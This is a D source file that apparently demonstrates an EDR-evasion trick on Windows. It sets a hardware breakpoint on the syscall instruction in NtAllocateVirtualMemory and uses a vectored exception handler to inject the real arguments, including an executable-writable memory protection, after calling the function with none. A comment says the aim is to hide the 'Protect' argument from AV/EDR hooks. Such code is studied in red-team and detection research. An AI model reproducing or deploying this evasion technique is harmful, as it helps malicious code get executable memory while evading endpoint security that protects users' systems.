import std.stdio;
import core.sys.windows.windows;
import hardwarebp;


extern (C) int memcmp(const void *str1, const void *str2, size_t n);

pragma(lib, "ntdll.lib");

enum {
    NTALLOCATEVIRTUALMEMORY_ENUM
}

struct NTAVMArgs {
  HANDLE    ProcessHandle;
  PVOID     *BaseAddress;
  ULONG_PTR ZeroBits;
  PSIZE_T   RegionSize;
  ULONG     AllocationType;
  ULONG     Protect;
}

// using a struct here instead of an array
struct STATE {
    NTAVMArgs NtAllocateVirtualMemoryArgs;
}

STATE state;
DWORD enumState;

LONG exceptionHandler(PEXCEPTION_POINTERS pExceptionInfo) {
    if (pExceptionInfo.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP) {

        ulong exceptionAddress = cast(ulong)pExceptionInfo.ExceptionRecord.ExceptionAddress;
        ulong exceptionRip = cast(ulong)pExceptionInfo.ContextRecord.Rip;

        if (pExceptionInfo.ContextRecord.Dr7 & 1) {
            
            // hit hwbp
            if (exceptionRip == pExceptionInfo.ContextRecord.Dr0) {
                PCONTEXT ctx = pExceptionInfo.ContextRecord;

                writefln("Syscall: 0x%x", cast(DWORD)pExceptionInfo.ContextRecord.Rax);

                switch (enumState) {
                    case NTALLOCATEVIRTUALMEMORY_ENUM:

                        ctx.R10 = cast(ULONG_PTR)state.NtAllocateVirtualMemoryArgs.ProcessHandle;
                        ctx.Rdx = cast(ULONG_PTR)state.NtAllocateVirtualMemoryArgs.BaseAddress;
                        ctx.R8 = cast(ULONG_PTR)state.NtAllocateVirtualMemoryArgs.ZeroBits;
                        ctx.R9 = cast(ULONG_PTR)state.NtAllocateVirtualMemoryArgs.RegionSize;

                        // the other 2 arguments are passed on the stack, Remember, We are passing NULL to everything, Due to AV/EDR's monitoring of the 'Protect' member.
                        *cast(ULONG_PTR*)(ctx.Rsp + (5 * PVOID.sizeof)) = state.NtAllocateVirtualMemoryArgs.AllocationType;
                        *cast(ULONG_PTR*)(ctx.Rsp + (6 * PVOID.sizeof)) = state.NtAllocateVirtualMemoryArgs.Protect;

                        break;

                   default:
                    pExceptionInfo.ContextRecord.Rip += 1;
                    break;

                }
            }
        }
        
        CONTINUE_EXECUTION(pExceptionInfo.ContextRecord);

        return EXCEPTION_CONTINUE_EXECUTION;

} else {

     return EXCEPTION_CONTINUE_SEARCH;
}

}


alias NTSTATUS = uint;

extern(Windows) NTSTATUS NtAllocateVirtualMemory();

PVOID findSyscall(PVOID fnAddr) {
    BYTE[2] syscallPattern = [ 0x0f, 0x05 ];

    for (SIZE_T i = 0; i < 23; i += 2) {
        if (!memcmp(cast(PBYTE)(fnAddr + i), &syscallPattern[0], 2)) {
            return cast(PVOID)(fnAddr + i);
        }
    }

    return NULL;
}

void main() {

    // Example, NtAllocateVirtualMemory
    initVeh(&exceptionHandler);

    PVOID procAddr = GetProcAddress(GetModuleHandleA("NTDLL"), "NtAllocateVirtualMemory");

    enumState = NTALLOCATEVIRTUALMEMORY_ENUM;

    setHwBp(findSyscall(procAddr), Drx.Dr0);

    SIZE_T regSize = 512;
    PVOID allocAddr;
    state.NtAllocateVirtualMemoryArgs.ProcessHandle = GetCurrentProcess();
    state.NtAllocateVirtualMemoryArgs.RegionSize = &regSize;
    state.NtAllocateVirtualMemoryArgs.BaseAddress = &allocAddr;
    state.NtAllocateVirtualMemoryArgs.AllocationType = MEM_COMMIT | MEM_RESERVE;
    state.NtAllocateVirtualMemoryArgs.Protect = PAGE_EXECUTE_READWRITE;

    NTSTATUS status = NtAllocateVirtualMemory(); // no args.
    
    writefln("[NtAllocateVirtualMemory] Allocated At 0x%x, Status: %x", allocAddr, status);

    getchar();
}